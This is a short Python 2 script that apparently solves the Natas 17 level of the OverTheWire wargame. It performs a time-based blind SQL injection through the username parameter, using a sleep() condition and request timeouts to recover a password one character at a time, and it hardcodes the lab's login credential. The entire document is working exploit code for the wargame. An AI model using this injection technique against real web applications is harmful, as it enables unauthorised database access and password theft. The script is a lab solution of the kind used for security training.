import string
import requests
from requests.auth import HTTPBasicAuth

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

def connect(pwd):
	return requests.get('http://natas17.natas.labs.overthewire.org/index.php?username=natas18" AND IF(password LIKE BINARY "' + pwd + '%", sleep(5), null) %23', timeout=1,auth=HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))

def is_success(pwd):
	try:
		r=connect(pwd)
		return False
	except requests.exceptions.Timeout:
		return True

count=0
pwd=""
for count in range(32):
	for i in charset:
		temp = pwd
		pwd += i
		print "Trying:"+pwd
		if is_success(pwd):
			print "Password starts with:"+pwd
			break
		else:
			pwd = temp

print "Found our fella:"+pwd
